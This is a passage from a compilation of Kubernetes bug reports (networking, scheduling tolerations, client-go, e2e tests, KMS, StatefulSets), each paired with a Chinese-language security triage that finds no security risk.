Connecting To 10.100.24.184...Could not open connection to the host, on port 4316: Connect failed
```

#### What did you expect to happen?

I expect a non host process container pod to be able to communicate to a host process container pod via a kubernetes Service without issues on Windows nodes.

#### How can we reproduce it (as minimally and precisely as possible)?

1. Create a kubernetes cluster with a Windows node. (ex. EKS with Windows Server 2019)
2. Create a pod running with hostNetwork: true. I am using the [amazon cloudwatch observability helm chart](https://github.com/aws-observability/helm-charts/tree/main/charts/amazon-cloudwatch-observability): 
```
helm repo add aws-observability https://aws-observability.github.io/helm-charts
helm repo update aws-observability
helm install --wait --create-namespace --namespace amazon-cloudwatch amazon-cloudwatch aws-observability/amazon-cloudwatch-observability --set clusterName=my-cluster-name --set region=my-cluster-region
```
3. Exec into a separate pod in the cluster and attempt to see if the cluster ip is reachable on the service port:
```
PS C:\> telnet 10.100.146.5 4316
Connecting To 10.100.146.5...Could not open connection to the host, on port 4316: Connect failed
```


#### Anything else we need to know?

Relevant discussion in #sig-windows on slack: https://kubernetes.slack.com/archives/C0SJ4AFB7/p1719608329839819

#### Kubernetes version

<details>

```console
$ kubectl version

Client Version: v1.30.1
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.30.2-eks-db838b0
```

</details>


#### Cloud provider

<details>
Amazon EKS
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture

BuildNumber  Caption                                   OSArchitecture  Version
17763        Microsoft Windows Server 2019 Datacenter  64-bit          10.0.17763

```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
从Issue内容来看，用户在Windows节点上运行了一个带有hostNetwork: true的Pod，并将其作为ClusterIP服务暴露。但是，当其他非hostNetwork的Pod尝试通过ClusterIP与其通信时，连接失败。这似乎是一个关于Windows节点上hostNetwork网络连接的问题。根据风险判断标准，该问题并未涉及任何安全风险，也未提及可能被攻击者利用的漏洞，因此风险评级判断为“不涉及”。

---

## Issue #126790 Inconsistency between the code and the doc when toleration has an empty key

- Issue 链接：[#126790](https://github.com/kubernetes/kubernetes/issues/126790)

### Issue 内容

#### What happened?

According to the [concept documentation](https://kubernetes.io/docs/concepts/scheduling-eviction/taint-and-toleration/#concepts)
> **An empty key** with operator Exists matches all keys, values and effects which means this **will tolerate everything**.

This means when a toleration's `key` is empty, it can match any taints no matter what value the `effect` is.

But this is inconsistent with the [API documentation](https://kubernetes.io/docs/concepts/scheduling-eviction/taint-and-toleration/#concepts):

> **If the key is empty**, operator must be Exists; this combination **means to match all values and all keys.**

This means even if a toleration's `key` is empty, the `effect` should also be the same to match a taint.

And **the code** implementation is following **the API documentation**, thus contradicting **the concept documentation**.


#### What did you expect to happen?

The concept documentation, the API documentation and the code should be consistent.


#### How can we reproduce it (as minimally and precisely as possible)?

1. Create a node with a taint
```bash
kubectl apply -f - <<EOF
apiVersion: v1
kind: Node
metadata:
  name: node-1
spec:
  taints:
    - key: simple-key
      value: simple-value
      effect: NoSchedule
EOF
```

2. Create a pod with a toleration whose key is empty, it should be able to land on `node-1` according to the concept documentation
```bash
kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: pod-1
spec:
  containers:
    - name: container-1
      image: nginx
  tolerations:
    - key: ''
      operator: Exists
      effect: NoExecute
EOF
```

3. Check the pod's scheduling result, it failed to be scheduled to `node-1`
```bash
$ kubectl describe pods pod-1
 Warning  FailedScheduling  0/1 nodes are available: 1 node(s) had untolerated taint {simple-key: simple-value}. preemption: 0/1 nodes are available: 1 Preemption is not helpful for scheduling.
```



#### Anything else we need to know?

/sig docs scheduling

#### Kubernetes version

1.30.2


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
经过分析，该Issue报告的是Kubernetes在tolerations的`key`为空时，代码实现和概念文档之间存在不一致的问题。具体来说，概念文档描述了当`key`为空且`operator`为`Exists`时，应该匹配所有的`key`、`value`和`effect`，即容忍所有的污点；而API文档和代码实现则要求`effect`也需要匹配才能容忍相应的污点。这个问题可能导致用户根据概念文档进行配置时，预期的容忍行为与实际不符，可能会影响调度。但这属于文档和功能实现不一致的问题，不涉及攻击者利用的安全漏洞。根据风险判断标准第6条，如果Issue不涉及安全问题，则风险评级判断为不涉及。

---

## Issue #126785 e2epod.DeletePodWithWait{,ByName} does not handle pods that get restarted

- Issue 链接：[#126785](https://github.com/kubernetes/kubernetes/issues/126785)

### Issue 内容

#### What happened?

`e2epod.DeletePodWithWaitByName` does (simplified)

```
        err := c.CoreV1().Pods(podNamespace).Delete(ctx, podName, metav1.DeleteOptions{})
        err = WaitForPodNotFoundInNamespace(ctx, c, podName, podNamespace, PodDeleteTimeout)
```

If the pod in question is managed by a controller or operator, then it is possible that it will be restarted in between the Delete and the WaitForPodNotFoundInNamespace, in which case WaitForPodNotFoundInNamespace will wait for the _new_ pod to not be present rather than the old one.

eg, some of the ovn-kubernetes e2e tests use this function to restart ovn-k control-plane pods in various circumstances (the e2e test kills a pod which is managed by a StatefulSet, knowing it will be restarted), and sometimes hits the race condition. eg, [here](https://github.com/ovn-org/ovn-kubernetes/actions/runs/10451772693/job/28939840358?pr=4623):

```
2024-08-19T11:40:56.3501692Z   I0819 11:40:56.349677 79626 delete.go:62] Deleting pod "ovnkube-db-2" in namespace "ovn-kubernetes"
2024-08-19T11:40:56.3606091Z   I0819 11:40:56.360068 79626 delete.go:70] Wait up to 5m0s for pod "ovnkube-db-2" to be fully deleted
...
2024-08-19T11:45:57.4798660Z   [FAILED] failed to delete pod ovnkube-db-2: pod "ovnkube-db-2" was not deleted: expected pod to not be found: Timed out after 300.001s.
2024-08-19T11:45:57.4799987Z   Expected
2024-08-19T11:45:57.4800476Z       <*v1.Pod | 0xc000eba488>: 
2024-08-19T11:45:57.4801044Z           metadata:
2024-08-19T11:45:57.4801863Z             creationTimestamp: "2024-08-19T11:41:00Z"
...
2024-08-19T11:45:57.5299664Z   to be nil
```

note that the `creationTimestamp` of the pod in question is _after_ the deletion.

#### What did you expect to happen?

Either

1. DeletePodWithWait{,ByName} checks the `resourceVersion` of the pod before deleting it, and waits specifically for _that_ version of the pod to not exist any more, or
2. DeletePodWithWait{,ByName} are documented as not handling this case

#### How can we reproduce it (as minimally and precisely as possible)?

Write an e2e test that deletes a pod that will be recreated automatically (by an `apps` API or by an operator).

#### Anything else we need to know?

/sig testing
/area e2e-test-framework

#### Kubernetes version

`v1.30.2`


#### Cloud provider

N/A


#### OS version

_No response_

#### Install tools

_No response_

#### Container runtime (CRI) and version (if applicable)

_No response_

#### Related plugins (CNI, CSI, ...) and versions (if applicable)

_No response_

### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
这个Issue描述了在使用`e2epod.DeletePodWithWait{,ByName}`函数删除一个由控制器或操作器（如StatefulSet）管理的Pod时，可能出现的竞态条件问题。具体而言，当删除操作执行后，控制器可能会立即重建该Pod，导致`WaitForPodNotFoundInNamespace`函数等待的新Pod而非原先的Pod被删除。这可能导致e2e测试用例无法正确判断Pod的删除状态，出现超时或错误。

从安全角度来看，这个问题主要影响的是测试框架的稳定性和准确性，并不涉及潜在的安全风险。该问题不会被攻击者利用来进行攻击，也不会导致系统的安全漏洞。

根据风险判断标准：
1. 该风险不能被攻击者利用。
2. 不会成为一个漏洞，也不会被分配CVE编号，使用CVSS 3.1评分标准打分，结果在high以下。
6. Issue不涉及安全问题，风险评级判断为不涉及。

---

## Issue #126778 kubectl exec to pods causes unexpected exit 0 in concurrence with jobs running

- Issue 链接：[#126778](https://github.com/kubernetes/kubernetes/issues/126778)

### Issue 内容

#### What happened?

We are having our EKS cluster and Node Groups working fine in our environment however whenever we are logged into a pod of our cluster then we are getting logged out after an hour automatically - this is happening when we are running batch using some scripts :-
Screen Shots -
EKS Version - 1.28
![image](https://github.com/user-attachments/assets/ddace079-ef8e-498a-80ff-954d63bdcf9f)

EKS Cluster
![image](https://github.com/user-attachments/assets/96265b59-9926-4ee2-8c9c-4c3c10921a23)
When we are logged in to a pod
![image](https://github.com/user-attachments/assets/e532bf77-abad-4d8c-b518-b4bac6c6f96b)

Kubectl Version [Client Version: version.Info{Major:"1", Minor:"23+", GitVersion:"v1.23.17-eks-0a21954", GitCommit:"cd5c12c51b0899612375453f7a7c2e7b6563f5e9", GitTreeState:"clean", BuildDate:"2023-04-15T00:35:51Z", GoVersion:"go1.19.6", Compiler:"gc", Platform:"linux/amd64"}
Server Version: version.Info{Major:"1", Minor:"28+", GitVersion:"v1.28.11-eks-db838b0", GitCommit:"5ec1757cec753faac1ea8374cf6bfee9a8b35c2a", GitTreeState:"clean", BuildDate:"2024-06-27T19:09:54Z", GoVersion:"go1.21.11", Compiler:"gc", Platform:"linux/amd64"}]
![image](https://github.com/user-attachments/assets/d549880d-b912-4721-9ae3-864d6cd9d386)

Docker version
[root@ip-10-152-145-146 bin]# docker version
Client: Docker Engine - Community
 Version:           19.03.8
 API version:       1.40
 Go version:        go1.12.17
 Git commit:        afacb8b7f0
 Built:             Wed Mar 11 01:22:56 2020
 OS/Arch:           linux/amd64
 Experimental:      false
![image](https://github.com/user-attachments/assets/df8210aa-8f77-43bc-a3ff-3406b8ca690b)

 


#### What did you expect to happen?

We do not want the automated signing out from EKS pods

#### How can we reproduce it (as minimally and precisely as possible)?

We are having our EKS cluster and Node Groups working fine in our environment however whenever we are logged into a pod of our cluster then we are getting logged out after an hour automatically - this is happening when we are running batch using some scripts

#### Anything else we need to know?

_No response_

#### Kubernetes version

Kubernetes Version is 1.28
![image](https://github.com/user-attachments/assets/63344523-3209-452b-b8a2-8a54456d2527)
Public Cloud Platform is AWS

Kubectl Version [Client Version: version.Info{Major:"1", Minor:"23+", GitVersion:"v1.23.17-eks-0a21954", GitCommit:"cd5c12c51b0899612375453f7a7c2e7b6563f5e9", GitTreeState:"clean", BuildDate:"2023-04-15T00:35:51Z", GoVersion:"go1.19.6", Compiler:"gc", Platform:"linux/amd64"}
Server Version: version.Info{Major:"1", Minor:"28+", GitVersion:"v1.28.11-eks-db838b0", GitCommit:"5ec1757cec753faac1ea8374cf6bfee9a8b35c2a", GitTreeState:"clean", BuildDate:"2024-06-27T19:09:54Z", GoVersion:"go1.21.11", Compiler:"gc", Platform:"linux/amd64"}]
![image](https://github.com/user-attachments/assets/d549880d-b912-4721-9ae3-864d6cd9d386)

Docker version
[root@ip-10-152-145-146 bin]# docker version
Client: Docker Engine - Community
 Version:           19.03.8
 API version:       1.40
 Go version:        go1.12.17
 Git commit:        afacb8b7f0
 Built:             Wed Mar 11 01:22:56 2020
 OS/Arch:           linux/amd64
 Experimental:      false
![image](https://github.com/user-attachments/assets/df8210aa-8f77-43bc-a3ff-3406b8ca690b)


#### Cloud provider

AWS


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
NAME="Amazon Linux"
VERSION="2"
ID="amzn"
ID_LIKE="centos rhel fedora"
VERSION_ID="2"
PRETTY_NAME="Amazon Linux 2"
ANSI_COLOR="0;33"
CPE_NAME="cpe:2.3:o:amazon:amazon_linux:2"
HOME_URL="https://amazonlinux.com/"
SUPPORT_END="2025-06-30"
$ uname -a
Linux ip-10-51-155-146.eu-west-1.compute.internal 5.10.214-202.855.amzn2.x86_64 #1 SMP Tue Apr 9 06:57:12 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux


#### Install tools

<details>


```
</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue描述了在EKS集群中，使用kubectl exec登录到Pod后，运行批处理脚本时，会在一小时后自动退出。这可能是由于会话超时、网络断开、资源限制或Pod本身的生命周期导致的。根据提供的信息，此问题属于操作使用或配置问题，没有证据表明存在可被攻击者利用的安全风险，也没有涉及高危漏洞。按照风险判断标准，此Issue不涉及安全风险。

---

## Issue #126770 client-go ListWatch may only get partial items when user provide a limit option

- Issue 链接：[#126770](https://github.com/kubernetes/kubernetes/issues/126770)

### Issue 内容

#### What happened?

There are some situations user wants to always list resources from etcd. eg, with no limit option, the server may return full list from apiserver cache, if there are lots of resources, there may be a 60s timeout of apiserver, and user can provide a limit=500 option to force request go through etcd with pagination.

But the following codes have a problem, when an expired error occurs, it will try to do a full list, but user code update the limit options in `TweakListOptionsFunc`, so this will get only 500 items. In another word, currently, client-go do not support user provided limit option.

```
func (p *ListPager) List(ctx context.Context, options metav1.ListOptions) (runtime.Object, bool, error) {
	if options.Limit == 0 {
		options.Limit = p.PageSize
	}
       // ...
	for {
		select {
		case <-ctx.Done():
			return nil, paginatedResult, ctx.Err()
		default:
		}
		obj, err := p.PageFn(ctx, options)
		if err != nil {
			if !errors.IsResourceExpired(err) || !p.FullListIfExpired || options.Continue == "" {
				return nil, paginatedResult, err
			}
			options.Limit = 0
			options.Continue = ""
			options.ResourceVersion = requestedResourceVersion
			options.ResourceVersionMatch = requestedResourceVersionMatch
			result, err := p.PageFn(ctx, options)
			return result, paginatedResult, err
		}
```

#### What did you expect to happen?

Support user supplied limit option, so there a way user can force request go through etcd, to avoid apiserver 60s timeout problem, this is very import for long running controllers, there controllers usually do very small amount list operations. to some extent, this will also help to reduce apiserver memory usage.

#### How can we reproduce it (as minimally and precisely as possible)?

1. create a 50000 pods
2. start a informer with with `TweakListOptionsFunc` and set option.Limit to 500, and set option.ResourceVersion to "" if it is "0" (because apiserver dosn't honor limit when resourceVersion is "0")
3. when the list in operating (we can see lots of pagination request), excute etcd compaction command: `etcdctl compaction $(etcdctl endpoint status --write-out="json"  | jq '.[0].Status.header.revision' | tr -d '\n')`

#### Anything else we need to know?

_No response_

#### Kubernetes version

I think it is for all versions


#### Cloud provider

I think all clouds


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
经过分析，该Issue描述了在使用client-go的ListWatch功能时，当用户提供了limit选项，在资源过期错误发生时，客户端会尝试进行全量列表操作，但由于用户在`TweakListOptionsFunc`中更新了limit选项，导致最终只能获取部分数据。这是一个功能性的问题，可能导致数据获取不完整。根据风险判断标准，此问题属于功能性缺陷，而非安全漏洞。

1. **攻击者无法利用**：该问题不会被攻击者利用来进行未经授权的操作。
2. **不可能成为漏洞**：此问题不会导致系统的机密性、完整性和可用性受到破坏，无法分配CVE编号，按照CVSS 3.1评分标准打分结果也不会在High以上。
3. **不涉及敏感信息泄露**：没有敏感信息的暴露或权限提升的风险。

因此，该Issue不涉及安全风险。

---

## Issue #126747 Bogus prohibition of `uniqueItems` in JSON schema in CRD

- Issue 链接：[#126747](https://github.com/kubernetes/kubernetes/issues/126747)

### Issue 内容

#### What happened?

https://github.com/kubernetes/apiextensions-apiserver/blob/v0.31.0/pkg/apis/apiextensions/validation/validation.go#L1007-L1009 has been there forever but makes no sense to me. Checking that constraint can be done in O(N) time and O(N) space. And I _can_ impose the functionally same constraint on a slice by setting `+listType=map` and using the corresponding (collection of) `+listMapKey` settings.

#### What did you expect to happen?

I expected that I can use `uniqueItems`.

#### How can we reproduce it (as minimally and precisely as possible)?

_I_ produced it while using kubebuilder. I put the `// +kubebuilder:validation:UniqueItems=true` comment on a field holding a slice (the `Destinations` field in `BindingSpec` in https://github.com/kubestellar/kubestellar/pull/2405).

#### Anything else we need to know?

🤷 

#### Kubernetes version

<details>

This has been there _forever_.

</details>


#### Cloud provider

<details>
N/A
</details>


#### OS version

<details>

N/A

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue讨论了在Kubernetes的CRD（自定义资源定义）中，JSON Schema中禁止使用`uniqueItems`的问题。提交者认为这个限制不合理，因为`uniqueItems`可以在O(N)时间和O(N)空间复杂度下检查数组中的元素唯一性，而且可以通过设置`+listType=map`和`+listMapKey`来实现相同的功能。

从安全角度来看，该Issue并未涉及任何潜在的安全风险：

1. 没有提到任何可被攻击者利用的漏洞。
2. 该问题主要是关于CRD中JSON Schema验证规则的设计，不涉及权限提升、命令执行等高风险问题。
3. 没有涉及日志泄露、敏感信息暴露等安全问题。
4. 根据风险判断标准，此Issue不涉及安全风险。

---

## Issue #126934 Kube-proxy conntrack logic does not consider Service traffic topology

- Issue 链接：[#126934](https://github.com/kubernetes/kubernetes/issues/126934)

### Issue 内容

_Originally posted by @adrianmoisey in https://github.com/kubernetes/kubernetes/issues/126130#issuecomment-2301842312_
            

An UDP Service with internalTrafficPolicy set to Local leaves stale conntrack entries after the endpoint is deleted.

This happens because the Service is deployed as a daemonset with one endpoint per node.

When the endpoint is deleted, the endpoint conntrack entry is deleted but , when the new endpoint is added it should delete the Service ClusterIP entry because the Service effectively went from 0 endpoints in the node (InternalTrafficPolicy Local) to 1 endpoint.

However, the kube-proxy logic to detect stale entries does not have into consideration any of the traffic distribution features for Services, making wrong assumptions because of this and leaving stale entries

https://github.com/kubernetes/kubernetes/blob/619b0059cf8c224461cb411fda090c8ff25d9f71/pkg/proxy/endpointschangetracker.go#L290-L350

Kudos to @adrianmoisey for the thorough investigation and reproducer

/sig network
/kind bug
/assign @aojea

### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue描述了在Kubernetes中，当UDP Service的internalTrafficPolicy设置为Local时，kube-proxy的conntrack逻辑未考虑服务流量拓扑，导致在删除endpoint后遗留了过期的conntrack条目。此问题可能导致服务的连接跟踪信息不正确，影响服务的可用性。但这种影响仅限于服务的正确性和可用性，没有涉及潜在的安全风险。根据风险判断标准，此问题不会被攻击者利用，也不会导致高风险的漏洞，故风险评级为不涉及。

---

## Issue #126929 Encryption at rest KMS plugin receives invalid authority headers from k8s grpc client

- Issue 链接：[#126929](https://github.com/kubernetes/kubernetes/issues/126929)

### Issue 内容

#### What happened?

KMS Plugins require communication via grpc UDS. Currently, the k8s grpc client sets the authority header to the socket path which is marked as invalid preventing successful socket communication. 

#### What did you expect to happen?

I expect a custom KMS provider plugin to be sent valid authority headers so that successful communication can be established between the k8s and grpc client/server.

#### How can we reproduce it (as minimally and precisely as possible)?

Create a grpc server according to the [k8s documentation on kms v2](https://kubernetes.io/docs/tasks/administer-cluster/kms-provider/#configuring-the-kms-provider-kms-v2) and attempt to establish socket communication.

#### Anything else we need to know?

This issue has been resolved in [this PR](https://github.com/kubernetes/kubernetes/pull/112597) for device plugins and CSI. The same solution will likely fix this issue as well. I will create a PR for this and link it here after.

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.30.4
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.29.4+k3s1
```

</details>


#### Cloud provider

<details>
None
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
PRETTY_NAME="Ubuntu 22.04.4 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.4 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy

$ uname -a
Linux computer-XPS-15-9530 6.5.0-44-generic #44~22.04.1-Ubuntu SMP PREEMPT_DYNAMIC Tue Jun 18 14:36:16 UTC 2 x86_64 x86_64 x86_64 GNU/Linux
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue描述了在KMS插件使用gRPC UDS通信时，Kubernetes的gRPC客户端将authority头设置为socket路径，这是无效的，导致无法成功建立通信。这个问题影响了KMS插件和gRPC客户端/服务器之间的正常通信。

根据风险判断标准，该问题属于功能性缺陷或配置错误，并未提及任何可能被攻击者利用的安全风险。没有迹象表明此问题会导致安全漏洞，也不会被分配CVE编号。因此，此问题不涉及安全风险。

---

## Issue #126919 StatefulSet PersistentVolumeClaimRetentionPolicy not deleting pods when `WhenScaled: Delete` is used

- Issue 链接：[#126919](https://github.com/kubernetes/kubernetes/issues/126919)

### Issue 内容

#### What happened?

When OwnerReferencesPermissionEnforcement admission plugin is used the PVCs are not deleted and KCM logs show

```
stateful_set.go:438] "Unhandled Error" err="error syncing StatefulSet e2e-statefulset-1256/ss, requeuing: could not update claim datadir-ss-2 for delete policy ownerRefs: persistentvolumeclaims \"datadir-ss-2\" is forbidden: cannot set blockOwnerDeletion if an ownerReference refers to a resource you can't set finalizers on: , <nil>" logger="UnhandledError"
```

#### What did you expect to happen?

PVCs should have ownerReferences set and the PVCs should be garbage collected on scale down

#### How can we reproduce it (as minimally and precisely as possible)?

3 of 6 of the following tests fail when OwnerReferencesPermissionEnforcement admission plugin is turned on
```
./hack/ginkgo-e2e.sh --ginkgo.focus=".*Non-retain StatefulSetPersistentVolumeClaimPolicy should.*" --ginkgo.v
```

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.29.8
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.32.0-alpha.0.233+b3c725627b15bb-dirty

```

</details>


#### Cloud provider

<details>
NA
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue描述了当启用OwnerReferencesPermissionEnforcement准入插件时，StatefulSet在缩容时无法正确删除关联的PersistentVolumeClaim（PVC）。错误日志显示，由于权限限制，无法设置PVC的ownerReferences，导致PVC未被删除。这是一个由于权限控制导致的功能性问题。

根据风险判断标准：
1. 该问题是由于权限限制导致的资源清理失败，不存在被攻击者利用的风险。
2. 该问题不会导致漏洞产生，不会被分配CVE编号，且按照CVSS 3.1评分标准，风险评分在高危以下。
3. 不涉及敏感信息泄露、不当操作或配置等安全风险。
4. 该问题不涉及拒绝服务（DoS）攻击，且即使存在资源泄露风险，也需要特定权限操作，影响有限。

综上所述，此Issue不涉及安全风险。

---

## Issue #126908 kubernetes v1.31.0: TypedNewDelayingQueue should be renamed to NewTypedDelayingQueue

- Issue 链接：[#126908](https://github.com/kubernetes/kubernetes/issues/126908)

### Issue 内容

#### What happened?

TypedNewDelayingQueue in k8s.io/client-go/util/workqueue does not follow the naming convention in the same package.


#### What did you expect to happen?

The naming pattern observed in k8s.io/client-go/util/workqueue suggests that TypedNewDelayingQueue should be renamed to NewTypedDelayingQueue.
Because we have NewTypedDelayingQueueWithConfig, and other functions are named in such rules, I think this is an obvious conversion tooling error and/or cut and paste error.

#### How can we reproduce it (as minimally and precisely as possible)?

There is no reproduction steps.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

kubernetes v1.31.0

```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
此Issue报告了kubernetes中`k8s.io/client-go/util/workqueue`包内一个函数命名不符合命名约定的问题。具体而言，函数`TypedNewDelayingQueue`应该重命名为`NewTypedDelayingQueue`，以符合该包内其他函数的命名规则。这是一个代码风格和命名规范的问题，不涉及任何安全风险。根据风险判断标准第6条，如果Issue不涉及安全问题，则风险评级判断为“不涉及”。因此，此Issue不涉及安全风险。

---

## Issue #126906 Get call to a non-existent namespace returns not-nil object when using the fake client

- Issue 链接：[#126906](https://github.com/kubernetes/kubernetes/issues/126906)

### Issue 内容

#### What happened?

When using client-go fake client to Get a resource (in this case, a namespace) that does not exist, the Get call is returning a non nil object along with the not found error.

#### What did you expect to happen?

If the resource does not exist, I would expect the returned object to be nil.

#### How can we reproduce it (as minimally and precisely as possible)?

```	
	client := fake.NewSimpleClientset()
	ns, err := client.CoreV1().Namespaces().Get(context.Background(), "some-namespace", metav1.GetOptions{})
	if err != nil {
		fmt.Println(err)
	}

	if ns != nil {
		fmt.Println("should not have happened")
	}
	fmt.Println(ns)
```

- When run with v0.31.0:
```
namespaces "some-namespace" not found
should not have happened
&Namespace{ObjectMeta:{      0 0001-01-01 00:00:00 +0000 UTC <nil> <nil> map[] map[] [] [] []},Spec:NamespaceSpec{Finalizers:[],},Status:NamespaceStatus{Phase:,Conditions:[]NamespaceCondition{},},}
```

- When run with v0.30.3:
```
namespaces "some-namespace" not found
nil
```

#### Anything else we need to know?

This seems to be an issue specific to client-go version v0.31.0.  The exact same snippet pasted above, when run with v0.30.3 behaves as expected.

#### Kubernetes version

<details>
The kubectl version is not really relevant.  The issue is specific to v0.31.0.  The issue is *not* observed in v0.30.3.
</details>


#### Cloud provider

<details>
N/A
</details>


#### OS version

<details>

```console
$ uname -a
Darwin MW6YR2N7X4 23.6.0 Darwin Kernel Version 23.6.0: Mon Jul 29 21:14:30 PDT 2024; root:xnu-10063.141.2~1/RELEASE_ARM64_T6000 arm64

```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
根据提供的Issue内容，该问题涉及到在使用client-go的fake client时，当获取一个不存在的资源（如namespace）时，返回了一个非nil对象以及一个"not found"错误。在之前的版本中（v0.30.3），相同的操作会返回一个nil对象。

这个问题主要影响开发者在测试环境下的代码行为，可能导致在测试时对返回对象的检查出现误判。然而，在生产环境中，使用的是真实的client，而不是fake client，因此生产环境的行为不会受到影响。

根据风险判断标准，此Issue不涉及安全风险：

1. **该风险能被攻击者利用**：此问题仅影响测试环境下的fake client行为，攻击者无法利用。
2. **该风险有可能成为一个漏洞，并被分配CVE编号，使用CVSS 3.1评分标准打分，结果要在high以上**：此问题不会导致安全漏洞，不会被分配CVE编号。
6. **如果Issue不涉及安全问题，则风险评级判断为不涉及**：因此，此Issue风险评级为不涉及。

---

## Issue #126885 e2e can't assert inside wait loops

- Issue 链接：[#126885](https://github.com/kubernetes/kubernetes/issues/126885)

### Issue 内容

https://github.com/kubernetes/kubernetes/blob/1e827f4b2a46981e4f3056b54b43363e787bbaaa/test/e2e/network/kube_proxy.go#L364-L366


seen in this https://prow.k8s.io/view/gs/kubernetes-jenkins/pr-logs/pull/kubernetes-sigs_cloud-provider-kind/120/pull-cloud-provider-kind-conformance-parallel-ga-only/1826605298777853952

```
0822 13:27:52.097309 76548 builder.go:135] rc: 7
I0822 13:27:52.611009 76548 kube_proxy.go:362] Unexpected error: 
    <exec.CodeExitError>: 
    error running /home/prow/go/src/k8s.io/kubernetes/_output/bin/kubectl --server=https://127.0.0.1:42531 --kubeconfig=/root/.kube/kind-test-config --namespace=kube-system exec grab-kube-proxy-metrics-9275 -- /bin/sh -x -c curl --silent 127.0.0.1:10249/metrics:
    Command stdout:
    
    stderr:
    + curl --silent 127.0.0.1:10249/metrics
    command terminated with exit code 7
    
    error:
    exit status 7
    {
        Err: <*errors.errorString | 0xc000c911e0>{
            s: "error running /home/prow/go/src/k8s.io/kubernetes/_output/bin/kubectl --server=https://127.0.0.1:42531 --kubeconfig=/root/.kube/kind-test-config --namespace=kube-system exec grab-kube-proxy-metrics-9275 -- /bin/sh -x -c curl --silent 127.0.0.1:10249/metrics:\nCommand stdout:\n\nstderr:\n+ curl --silent 127.0.0.1:10249/metrics\ncommand terminated with exit code 7\n\nerror:\nexit status 7",
        },
        Code: 7,
    }
E0822 13:27:52.611557   76548 core_dsl.go:427] "Observed a panic" panic=<
	�[1m�[38;5;9mYour Test Panicked�[0m
	�[38;5;243mk8s.io/kubernetes/test/e2e/network/kube_proxy.go:362�[0m
	  When you, or your assertion library, calls Ginkgo's Fail(),
	  Ginkgo panics to prevent subsequent assertions from running.
	
	  Normally Ginkgo rescues this panic so you shouldn't see it.
	
	  However, if you make an assertion in a goroutine, Ginkgo can't capture the
	  panic.
	  To circumvent this, you should call
	
	  	defer GinkgoRecover()
	
	  at the top of the goroutine that caused this panic.
	
	  Alternatively, you may have made an assertion outside of a Ginkgo
	  leaf node (e.g. in a container node or some out-of-band function) - please
	  move your assertion to
